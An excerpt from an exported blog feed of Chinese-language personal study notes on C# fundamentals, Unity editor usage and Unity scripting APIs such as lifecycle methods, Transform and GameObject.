存储</h3><blockquote><p>CG：垃圾回收器（自动回收堆中的无引用数据）。（可手动，一般是交互时间最少的时候回收）</p><p>装箱：值-&gt;object（堆开辟空间，值存入堆中，返回堆地址）<br>拆箱：object-&gt;值（判断类型，返回已经装箱的引用）<br>非常消耗性能。（避免方法：重载，泛型）</p><p>字符串池：S1 =“ab”;  S2=”ab”;    //S1与S2相等<br>每次修改字符串相当于重新开辟了空间，object同理。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">StringBuilder str = <span class="keyword">new</span> StringBuilder(初始大小);    <span class="comment">//可变字符串</span></span><br></pre></td></tr></table></figure><hr><h2 id="六、类与对象"><a href="#六、类与对象" class="headerlink" title="六、类与对象"></a>六、类与对象</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>访问级别  class  类名（推荐首字母大写）  { 类成员… }<br>一般情况：数据私有，方法公开。</p></blockquote><ul><li>public  ：公有访问。不受任何限制，任何地方都可以引用，特殊场景不安全</li><li>private  ：私有访问。只限于本类成员访问，子类，实例都不能访问，可以用在本类种独有的方法。</li><li>protected  ：保护访问。只限于本类和子类访问，实例不能访问。</li><li>internal  ：内部访问。只限于本项目内访问，其他项目不能访问。</li><li>protected internal 组合：内部保护访问。只限于本项目或是子类访问，其他项目不能访问。</li></ul><blockquote><p>修饰符：<br>static：静态的（同类型类共用一个变量，通过类名调用）（类被加载时静态成员就存在）</p><p>存储：<br>类中方法外的变量：①具有默认值，②存于堆，③可以与局部变量重名（用this.区分）<br>类的值（声明堆存于堆），引用（声明堆存于另一个堆）</p></blockquote><h3 id="2-类中成员"><a href="#2-类中成员" class="headerlink" title="2 类中成员"></a>2 类中成员</h3><blockquote><p>类 { 字段  属性  构造函数  方法 }</p><p>字段：类中元素。</p><p>属性：public string Name { get { return name }} set { this.name =value; } }<br>get可读，set可写。<br>自动属性：public string Passwd { get; set; }<br>包含一个字段（数据）和两个方法。</p><p>构造函数：（访问级别）（类名）（）{ }<br>new的时候使用的是构造函数。<br>一个类无构造函数会自动给一个无参构造函数。<br>构造函数：this( 本构造函数参数 ) 可以调用另一个构造函数。</p></blockquote><ul><li>public 类：公开类，创建对象时初始化。</li><li>private 类 ：无法在类外用这个类（称为单例）。</li><li>static 类：初始化类的静态数据成员，类被加载时调用一次。</li></ul><blockquote><p>方法：函数。</p></blockquote><h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.name; <span class="comment">//数据成员的引用</span></span><br><span class="line">Wife wife01; <span class="comment">//声明Wife类型的引用</span></span><br><span class="line">wife01 = <span class="keyword">new</span> Wife(); <span class="comment">//Wife类型实例化</span></span><br></pre></td></tr></table></figure><h3 id="4-继承"><a href="#4-继承" class="headerlink" title="4 继承"></a>4 继承</h3><blockquote><p>例如：internal class student:People。<br>此时Student类拥有People类中的公共和保护类型代码。<br>Student为子类，People为父类。<br>子类可以用父类公共和保护类型代码，父类不能用子类代码。<br>父类私有代码子类不可以使用。</p><p>静态类不能被继承，但是静态方法和属性可以被继承。</p></blockquote><h3 id="5-引用"><a href="#5-引用" class="headerlink" title="5 引用"></a>5 引用</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类型的引用指向子类的对象。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//只能使用父类成员。</span></span><br><span class="line">Person person02 =<span class="keyword">new</span> Student(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//如果需要访问该子类成员，需要强制类型转换。</span></span><br><span class="line">Student stu02 = (Student)person02;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转化成其他家族成员会抛出异常。</span></span><br><span class="line">Teacher teacher02 =(Teacher)person02;</span><br><span class="line">teacher02.Salary = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//若可以运行则不抛出异常，people = null。</span></span><br><span class="line">teacher people = student <span class="keyword">as</span> teacher;</span><br></pre></td></tr></table></figure><p><strong>例子：</strong><a href="https://github.com/Magialeaf/Game/tree/main/Untiy/Scripts/List.cs">my::简单线性表</a>   <a href="https://github.com/Magialeaf/Game/tree/main/Untiy/Scripts/Direction.cs">my::二维数组方向</a></p><hr><h2 id="七、集合"><a href="#七、集合" class="headerlink" title="七、集合"></a>七、集合</h2><blockquote><p><code>List&lt;type&gt;</code>列表</p><p><code>Dictionary&lt;key，value&gt;</code>字典</p></blockquote><hr><h2 id="八、结构体"><a href="#八、结构体" class="headerlink" title="八、结构体"></a>八、结构体</h2><h3 id="1-与类区别"><a href="#1-与类区别" class="headerlink" title="1 与类区别"></a>1 与类区别</h3><blockquote><p>与类语法相似，但结构体属于值类型，类属于引用类型。</p><p>区别：结构体包含的无参数构造函数要给所有属性先赋值。</p><p>适用：点，颜色等轻量级对象。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity使用</title>
      <link href="/posts/4d74a038.html"/>
      <url>/posts/4d74a038.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unity使用"><a href="#Unity使用" class="headerlink" title="Unity使用"></a>Unity使用</h1><hr><h2 id="〇、项目管理"><a href="#〇、项目管理" class="headerlink" title="〇、项目管理"></a>〇、项目管理</h2><h3 id="1-项目操作"><a href="#1-项目操作" class="headerlink" title="1 项目操作"></a>1 项目操作</h3><ul><li><p>打开项目</p><blockquote><p>直接在Unity Hub中选择带有资源的主文件夹即可</p></blockquote></li></ul><hr><h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><h3 id="1-移动"><a href="#1-移动" class="headerlink" title="1 移动"></a>1 移动</h3><blockquote><p>按住鼠标右键 + wsad移动 + qe上下 </p><p>qwerty    对物体进行不同的操作</p></blockquote><h3 id="2-定位"><a href="#2-定位" class="headerlink" title="2 定位"></a>2 定位</h3><blockquote><p>F    中心定位<br>V    顶点吸附<br>ctrl + shift + F    当前物体到视野处<br>alt + 鼠标左键   围绕物体旋转<br>alt + 鼠标右键   围绕物体放大缩小</p><p>ctrl + z  撤回<br>ctrl + y  前进<br>ctrl + d  复制</p></blockquote><h2 id="二、界面"><a href="#二、界面" class="headerlink" title="二、界面"></a>二、界面</h2><h3 id="1-界面显示"><a href="#1-界面显示" class="headerlink" title="1 界面显示"></a>1 界面显示</h3><blockquote><p>scene右上角，切换 3D 和 2D。</p></blockquote><h3 id="2-场景"><a href="#2-场景" class="headerlink" title="2 场景"></a>2 场景</h3><blockquote><p>一个scene相当于一关，制作完成scene后应当保存scene。</p></blockquote><hr><h2 id="三、材质"><a href="#三、材质" class="headerlink" title="三、材质"></a>三、材质</h2><blockquote><p>物体样式都是通过新建材质，然后改材质参数来进行修改的</p></blockquote><h3 id="1-单个物体"><a href="#1-单个物体" class="headerlink" title="1 单个物体"></a>1 单个物体</h3><ul><li><p>基本属性</p><blockquote><p>position：当前位置坐标。（单位：米） </p><p>rotation：当前旋转角度 。</p><p>scale：缩放比例。</p></blockquote></li><li><p>scene面板</p><blockquote><p>center - pivot：改变轴心点。</p><p>gobal - local：改变坐标朝向。</p></blockquote></li></ul><h3 id="2-组件"><a href="#2-组件" class="headerlink" title="2 组件"></a>2 组件</h3><ul><li>Transform变换组件（如上基本属性）</li><li>Mesh Filter网格过滤器：形状</li><li>Mesh Renderer网格渲染器：材质</li></ul><h3 id="3-打组"><a href="#3-打组" class="headerlink" title="3 打组"></a>3 打组</h3><ul><li><p>父子对象</p><blockquote><p>父对象坐标相对于全局。</p><p>子对象坐标相对于父物体。</p></blockquote></li></ul><hr><h2 id="四、camera"><a href="#四、camera" class="headerlink" title="四、camera"></a>四、camera</h2><hr><h2 id="五、渲染"><a href="#五、渲染" class="headerlink" title="五、渲染"></a>五、渲染</h2><hr><h2 id="六、光"><a href="#六、光" class="headerlink" title="六、光"></a>六、光</h2><hr><h2 id="七、动画"><a href="#七、动画" class="headerlink" title="七、动画"></a>七、动画</h2><h3 id="1-使用流程"><a href="#1-使用流程" class="headerlink" title="1 使用流程"></a>1 使用流程</h3><ul><li><p>显示动画视图：Window——Animation</p><ul><li><p>录制</p><blockquote><ol><li><p>Animation——Animation。（ctrl + 6）</p></li><li><p>给指定组件：add Component——Animation。</p></li><li>Animation中点击create。</li><li>add property，对组件操作。</li><li>面板左上红色按钮开始录制，调轴，设置动画效果。</li></ol></blockquote></li><li><p>使用</p><blockquote><ol><li>Animation中补充动画，一运行就会播放。</li><li>Animations中补充动画，选择自动播放。</li></ol></blockquote></li></ul></li><li><p>Animation——Animation使用</p><blockquote><p>时间轴：1:00 表示第1秒第00帧。</p><p>轴上的点：一个动画操作。add property可以添加对指定一个物体的一个动画操作。</p><p>轴上左键双击（或右键——Add Key）：添加轴上点。设置上一点到这一点的帧数，可以设置起始位置和结束位置属性，中间的帧数会自动补齐。</p><p>下面Dopesheet：点，Curves：线。</p><p>提示：</p><ul><li>Material在一个物体的最下面</li></ul></blockquote></li></ul><h3 id="2-动画状态"><a href="#2-动画状态" class="headerlink" title="2 动画状态"></a>2 动画状态</h3><ul><li>Default：默认，一次</li><li>Once：一次</li><li>Loop：循环</li><li>Clamp Forever：播放一次后固定到最后一帧不可再操作</li><li>Ping Pong：自动来回</li></ul><hr><h2 id="八、其他"><a href="#八、其他" class="headerlink" title="八、其他"></a>八、其他</h2><h3 id="1-预制件"><a href="#1-预制件" class="headerlink" title="1 预制件"></a>1 预制件</h3><blockquote><p>同类的对象拖动至 Assets 中，可以对其进行操作，然后应用到所有同类对象中。</p><p>改 Assets 会对所有对象生效，改 Object 的仅对自己生效，可以选择还原或应用。</p><p>Prefab——：<br>Select：通过预制件实例找到对应预制件。<br>Overrides——Revert all：全部还原。<br>Overrides——Apply all：全部应用。</p></blockquote><h3 id="2-InputManage"><a href="#2-InputManage" class="headerlink" title="2 InputManage"></a>2 InputManage</h3><ul><li><p>编辑器</p><blockquote><p>输入管理器，用于让用户自定义按键。</p><p>Edit——Project Setting——Input</p><p>Size：按键个数。</p></blockquote></li><li><p>按钮属性</p><blockquote><p>Name：按钮名字。</p><p>Descriptive Name：正向按钮描述信息。</p><p>Descriptive Negative Name：负向按钮描述信息。</p><p>正向按钮和负向按钮都有两个，一个按下返回正数一个返回负数。（按钮不够可以写重名按钮来扩充按钮）</p><p>Negative Button：按下按键返回负数（-1）。</p><p>Positive Button：按下按键返回正数（1）。</p><p>Alt Negative Button：按下按键返回负数（-1）。</p><p>Alt Positive Button：按下按键返回正数（1）。</p><p>初始按钮值为0。按下正向按钮后值会由0依速度变成1，按钮负向按钮后值会由0依速度变成-1。</p><p>Gravity：复位速度，值归到0的速度。</p><p>Sensitivity：灵敏度，0变到值的速度。</p><p>Type：按键类型。键鼠，鼠标移动等。</p><p>Axis：鼠标移动时选定轴。（3rd是鼠标滚轮）</p></blockquote></li></ul><hr><h2 id="九、问题"><a href="#九、问题" class="headerlink" title="九、问题"></a>九、问题</h2><p>Q1、您暂无权限在该组织中创建远程仓库！   </p><ul><li><a href="https://developer.unity.cn/ask/question/62d1537cedbc2a39f792b76f">解决方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity脚本</title>
      <link href="/posts/cf1dc19e.html"/>
      <url>/posts/cf1dc19e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unity脚本"><a href="#Unity脚本" class="headerlink" title="Unity脚本"></a>Unity脚本</h1><blockquote><p><a href="https://docs.unity.cn/cn/2021.1/ScriptReference/index.html">official::Unity 脚本 API</a></p><p>VS提取方法：Ctrl + R &amp;&amp; Ctrl + M</p></blockquote><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><ul><li><p>定义</p><blockquote><p>脚本是附加在游戏物体上用于定义游戏对象行为的指令代码。</p></blockquote></li><li><p>添加</p><blockquote><p>文件名必须与类名一致。</p><p>写好的脚本必须附加到物体上才执行。</p><p>附加到游戏物体的脚本类必须从MonoBehaviour类继承。</p></blockquote></li><li><p>编译</p><blockquote><p>源代码( CLS ) -&gt; 中间语言( Mono Runtime )（中间产物是 .dll ） -&gt; 机器码。</p></blockquote></li></ul><hr><h2 id="二、脚本"><a href="#二、脚本" class="headerlink" title="二、脚本"></a>二、脚本</h2><h3 id="1-脚本操作"><a href="#1-脚本操作" class="headerlink" title="1 脚本操作"></a>1 脚本操作</h3><h4 id="1-1-新建脚本默认"><a href="#1-1-新建脚本默认" class="headerlink" title="1.1 新建脚本默认"></a>1.1 新建脚本默认</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">NewBehaviourScript</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">   <span class="comment">// 初始化被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">   <span class="comment">//  约0.02秒被调用一次</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-修改新建默认"><a href="#1-2-修改新建默认" class="headerlink" title="1.2 修改新建默认"></a>1.2 修改新建默认</h4><blockquote><p>默认模板存放位置：Unity\2021.3.5f1c1\Editor\Data\Resources\ScriptTemplates</p></blockquote><h4 id="1-3-开发工具设置"><a href="#1-3-开发工具设置" class="headerlink" title="1.3 开发工具设置"></a>1.3 开发工具设置</h4><blockquote><p>Edit——Preferences——External Tools——External Script Editor</p></blockquote><h4 id="1-4-脚本辅助操作"><a href="#1-4-脚本辅助操作" class="headerlink" title="1.4 脚本辅助操作"></a>1.4 脚本辅助操作</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写在其他脚本中，写了后Untiy会自动判断该物体是否挂了MyScript，没有则挂上</span></span><br><span class="line">[<span class="meta">RequireComponent(typeof(MyScript))</span>]</span><br></pre></td></tr></table></figure><h3 id="2-脚本生命周期"><a href="#2-脚本生命周期" class="headerlink" title="2 脚本生命周期"></a>2 脚本生命周期</h3><blockquote><p><a href="https://docs.unity3d.com/cn/2017.2/Manual/index.html">official::脚本API</a></p><p><a href="https://www.jianshu.com/p/f6c0bf8ad1e5">脚本生命流程图</a></p></blockquote><h4 id="2-1-格式"><a href="#2-1-格式" class="headerlink" title="2.1 格式"></a>2.1 格式</h4><blockquote><p>类：字段+方法。</p><p>属性：一般不写。（编辑器中无法普通显示）</p><p>构造函数：不写。</p></blockquote><h4 id="2-2-字段"><a href="#2-2-字段" class="headerlink" title="2.2 字段"></a>2.2 字段</h4><ul><li><code>public</code> 会显示可重新赋值。（要隐藏在字段上一行加上 <code>[HideInInspector]</code> ）</li><li><code>private</code>不会显示。（要显示需要在字段上一行加上 <code>[SerializeField]</code> ）</li><li><code>[SerializeField]</code>：（序列化字段）在编辑器中显示私有变量。（可以重新赋值）</li><li><code>[HideInInspector]</code>：（隐藏检查器）在编辑器中隐藏公有变量。</li></ul><blockquote><p><code>[Range(n,m)]：限定数字范围为[n,m]</code></p></blockquote><h4 id="2-3-方法"><a href="#2-3-方法" class="headerlink" title="2.3 方法"></a>2.3 方法</h4><h5 id="2-3-1-初始化"><a href="#2-3-1-初始化" class="headerlink" title="2.3.1 初始化"></a>2.3.1 初始化</h5><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 都是在创建游戏对象时执行一次，但是执行完所有对象的Awake()后才执行所有对象的Start()。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span>;</span><br><span class="line"><span class="comment">// Awake：物体启用执行（仅一次）。</span></span><br><span class="line"><span class="comment">// Start：脚本启用执行（仅一次）。</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnEnable</span>()</span>;</span><br><span class="line"><span class="comment">// OnEnable：脚本启用执行（每次）。</span></span><br></pre></td></tr></table></figure><h5 id="2-3-2-持续更新"><a href="#2-3-2-持续更新" class="headerlink" title="2.3.2 持续更新"></a>2.3.2 持续更新</h5><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FixedUpdate()每隔固定时间执行一次（时间可以修改），默认0.02s，不会受渲染的影/响。</span></span><br><span class="line"><span class="comment">// 适用于：对物体做物理操作（移动，旋转）。</span></span><br><span class="line"><span class="comment">// 修改：Edit——Project Settings——Time——Fixed Timestep。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update()每个渲染帧执行一次，执行间隔不固定（受渲染影响）。</span></span><br><span class="line"><span class="comment">//适用于：处理游戏逻辑。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注：渲染时间不固定（每帧的渲染量不同）</span></span><br><span class="line"><span class="comment">// LateUpdate()：在Update()执行完后执行一次。（与Update处于同一渲染帧）</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">LateUpdate</span>()</span> ;</span><br></pre></td></tr></table></figure><h5 id="2-3-3-输入事件"><a href="#2-3-3-输入事件" class="headerlink" title="2.3.3 输入事件"></a>2.3.3 输入事件</h5><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">OnMouseEnter <span class="comment">// 鼠标移入到当前Collider时调用</span></span><br><span class="line">OnMouseOver <span class="comment">// 鼠标经过当前Collider时调用</span></span><br><span class="line">OnMouseExit <span class="comment">// 鼠标离开当前Collider时调用</span></span><br><span class="line">OnMouseDown <span class="comment">// 鼠标按下当前Collider时调用</span></span><br><span class="line">OnMouseUp <span class="comment">// 鼠标在当前Collider上抬起时调用</span></span><br></pre></td></tr></table></figure><h5 id="2-3-4-场景渲染"><a href="#2-3-4-场景渲染" class="headerlink" title="2.3.4 场景渲染"></a>2.3.4 场景渲染</h5><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">OnBecameVisible <span class="comment">// 当Mesh Renderer在任何相机上可见时调用</span></span><br><span class="line">OnBecameInvisible <span class="comment">// 当Mesh Renderer在任何相机上都不可见时调用</span></span><br></pre></td></tr></table></figure><h5 id="2-3-5-结束阶段"><a href="#2-3-5-结束阶段" class="headerlink" title="2.3.5 结束阶段"></a>2.3.5 结束阶段</h5><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">OnDisable <span class="comment">// 对象变为不可用或附属游戏对象非激活状态时此函数被调用</span></span><br><span class="line">OnDestroy <span class="comment">// 当脚本摧毁或附属游戏对象被销毁时被调用</span></span><br><span class="line">OnApplicationQuit <span class="comment">// 应用程序退出时被调用</span></span><br></pre></td></tr></table></figure><h3 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h3><ul><li><p>C#逆向工具</p><blockquote><p>ILspy<br>Library——ScriptAssemblies——脚本中间语言存储位置</p></blockquote></li><li><p>语句调试</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在控制台中显示一条语句</span></span><br><span class="line">Debug.Log(<span class="string">&quot;&quot;</span>);</span><br><span class="line">Debug.LogFormat(<span class="string">&quot;&quot;</span>); <span class="comment">//格式化输出</span></span><br><span class="line"><span class="comment">// 在控制台中显示一条语句，只在脚本里用（属于MonoBehaviour的方法）</span></span><br><span class="line">print();</span><br><span class="line"></span><br><span class="line"><span class="comment">// a到b用白线连接</span></span><br><span class="line">Debug.DrawLine(a,b);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Windows——General——Console</p><blockquote><p>Collapse：折叠相同项。</p></blockquote></li><li><p>VS调试</p><blockquote><p>F12——找到方法源头</p><p>VS断点——VS启动调试——Unity开始游戏——回到VS中调试</p><p>调试——窗口——即时调试 / 自动调试 / 监视</p></blockquote></li></ul><h3 id="4-常用API"><a href="#4-常用API" class="headerlink" title="4 常用API"></a>4 常用API</h3><h4 id="4-1-核心类图"><a href="#4-1-核心类图" class="headerlink" title="4.1 核心类图"></a>4.1 核心类图<img src="/posts/cf1dc19e/核心类图.png" alt></h4><h4 id="4-2-Component"><a href="#4-2-Component" class="headerlink" title="4.2 Component"></a>4.2 Component</h4><blockquote><p>查找（在当前物体、后代、先辈）组件的功能。</p></blockquote><ul><li><p>this.GetComponent&lt; name &gt;()：其他组件</p></li><li><p>获取所有组件名</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponents();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> comp)</span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取父子组件</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父</span></span><br><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponentsInParent&lt;MeshRenderer&gt;();</span><br><span class="line"><span class="comment">// 子</span></span><br><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponentsInChildren&lt;MeshRenderer&gt;();</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-3-Transform"><a href="#4-3-Transform" class="headerlink" title="4.3 Transform"></a>4.3 Transform</h4><blockquote><p>查找（父、根、子）变换组件，改变对象的位置、旋转、缩放比例。</p></blockquote><ul><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象在世界坐标系的位置</span></span><br><span class="line"><span class="keyword">this</span>.transform.position;</span><br><span class="line"><span class="comment">// 对象相对父物体的位置</span></span><br><span class="line"><span class="keyword">this</span>.transform.localPosition;</span><br><span class="line"><span class="comment">// rotation同理，scale的local同理（相对父物体）</span></span><br><span class="line"><span class="comment">// lossyscale：模型与自身的缩放比例（可理解为全局）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 孩子数</span></span><br><span class="line"><span class="keyword">this</span>.transform.childCount;</span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// y是高度轴，Space.Self：自身坐标轴，Space.World：世界坐标轴（Space默认self）</span></span><br><span class="line"><span class="comment">// 位置增减变化</span></span><br><span class="line"><span class="keyword">this</span>.transform.translate(x,y,z,space);</span><br><span class="line"><span class="comment">// 角度增减变化（四元数旋转）</span></span><br><span class="line"><span class="keyword">this</span>.transform.Rotate(x,y,z,space);</span><br><span class="line"><span class="comment">// 围绕点，按哪个轴，旋转角度</span></span><br><span class="line"><span class="keyword">this</span>.transform.transform.RotateAround(point,axis,angle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物体在局部位置移动xyz后转化成世界坐标返回</span></span><br><span class="line">worldPosition = <span class="keyword">this</span>.transform.TransformPoint(x, y, z);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 旋转，照相机的视口对准目标</span></span><br><span class="line"><span class="keyword">this</span>.transform.LookAt(Vector3);</span><br></pre></td></tr></table></figure></li><li><p>获取父子物体的transform</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子物体</span></span><br><span class="line"><span class="keyword">foreach</span>(Transform child <span class="keyword">in</span> <span class="keyword">this</span>.transform);</span><br><span class="line"><span class="comment">// 根物体</span></span><br><span class="line"><span class="keyword">this</span>.transform.root;</span><br><span class="line"><span class="comment">// 父物体</span></span><br><span class="line"><span class="keyword">this</span>.transform.parent;</span><br><span class="line"><span class="comment">// 认爸爸(参数2：坐标视为默认世界坐标（true），本地坐标（false）)</span></span><br><span class="line"><span class="keyword">this</span>.transform.setParent(transform , worldposition);</span><br><span class="line"><span class="comment">// 找孩孙(可以用于找孩子的孩子，但是不建议)</span></span><br><span class="line"><span class="keyword">this</span>.transform.Find(<span class="string">&quot;child&#x27;s name [ / child&#x27;s name ... ]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找孩子</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span> ; i &lt; <span class="keyword">this</span>.transform.childCount ; i++ )</span><br><span class="line">    Transform tf = <span class="keyword">this</span>.transform.GetChild(i) ;</span><br><span class="line"><span class="comment">// 解孩子</span></span><br><span class="line"><span class="keyword">this</span>.transform.DetachChildren();</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-4-GameObject"><a href="#4-4-GameObject" class="headerlink" title="4.4 GameObject"></a>4.4 GameObject</h4><ul><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实际激活状态（父可能被禁用但自身没有）</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.activeInHierarchy;</span><br><span class="line"><span class="comment">// 自身激活状态</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.activeSelf;</span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置（启用/禁用）</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.SetActive(<span class="built_in">bool</span>);</span><br><span class="line"><span class="comment">// 添加class类组件</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.AddComponent&lt;<span class="keyword">class</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过游戏名称找到物体（不建议使用）</span></span><br><span class="line">GameObject.Find(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 获取所有使用该标签的物体，返回数组</span></span><br><span class="line">GameObject.FindGameObjectsWithTag( <span class="string">&quot;tag&quot;</span> );</span><br><span class="line"><span class="comment">// 获取单个标签的物体</span></span><br><span class="line">GameObject.FindWithTag( <span class="string">&quot;tag&quot;</span> );</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例：找光</span></span><br><span class="line">GameObject lightGo = <span class="keyword">new</span> GameObject(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">Light light = lightGo.AddComponent&lt;Light&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找子物体Object</span></span><br><span class="line"><span class="keyword">private</span> Transform pointLight;</span><br><span class="line">pointLight = <span class="keyword">this</span>.transform.GetChild(<span class="number">0</span>);</span><br><span class="line">pointLight.gameObject.SetActive(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-5-Object"><a href="#4-5-Object" class="headerlink" title="4.5 Object"></a>4.5 Object</h4><ul><li><p>属性</p></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除一个对象（对象，延迟时间）</span></span><br><span class="line">Destroy(obj,delay);</span><br><span class="line"><span class="comment">// 加载新场景时该对象不被删除</span></span><br><span class="line">DontDestroyOnLoad(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找对象（单个/全部）</span></span><br><span class="line">FindObjectOfType&lt;<span class="keyword">class</span>&gt;();</span><br><span class="line">FindObjectsOfType&lt;<span class="keyword">class</span>&gt;();</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-6-Time"><a href="#4-6-Time" class="headerlink" title="4.6 Time"></a>4.6 Time</h4><ul><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 秒计算，游戏开始的时间（只读）</span></span><br><span class="line">Time.time;</span><br><span class="line"><span class="comment">// 秒计算，完成最后一帧的时间，渲染影响（只读）</span></span><br><span class="line">Time.deltaTime;</span><br><span class="line"><span class="comment">// 秒计算，完成最后一帧时间，固定。</span></span><br><span class="line">Time.fixedDeltaTime;</span><br><span class="line"><span class="comment">// 技巧：Update中为了同步可以用速度 * 每帧消耗时间</span></span><br><span class="line"><span class="keyword">this</span>.transform.Rotate(<span class="number">0</span>,<span class="number">1</span>*Time.deltaTime,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 倍数，时间缩放，影响FixedUpdate更新速度（0：暂停，1：正常）</span></span><br><span class="line">Time.timeScale;</span><br><span class="line"><span class="comment">// 倍数，不受缩放影响的每帧间隔</span></span><br><span class="line">Time.unscaledDeltaTime;</span><br><span class="line"><span class="comment">// 实际游戏运行时间</span></span><br><span class="line">Time.realtimeSinceStartup;</span><br></pre></td></tr></table></figure></li><li><p>方法</p></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 倒计时</span></span><br><span class="line"><span class="comment">// 1.Update 调用，判断当前时间和下一执行时间差。</span></span><br><span class="line"><span class="comment">// （例：发射子弹）</span></span><br><span class="line"><span class="function"><span 